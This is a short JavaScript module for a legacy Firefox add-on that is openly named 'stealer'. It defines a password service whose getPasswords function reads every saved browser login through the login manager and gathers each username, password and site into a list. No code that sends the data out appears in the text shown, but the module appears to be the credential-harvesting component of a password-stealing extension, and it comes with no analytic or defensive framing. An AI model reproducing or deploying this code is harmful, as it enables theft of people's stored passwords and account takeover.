var EXPORTED_SYMBOLS = [];

const Cu = Components.utils;

Cu.import("resource://stealer/common.js");
Cu.import("resource://gre/modules/Services.jsm");

StealerBG.PasswordService = {
  init: function() {
  },

  getPasswords: function() {
    let results = [];
    let logins = Services.logins.getAllLogins();
    for (var i = 0; i < logins.length; i++) {
      results.push({
        username: logins[i].username,
        password: logins[i].password,
        host: logins[i].hostname
      });
    }
    return results;
  }
};

(function() { this.init(); }).apply(StealerBG.PasswordService);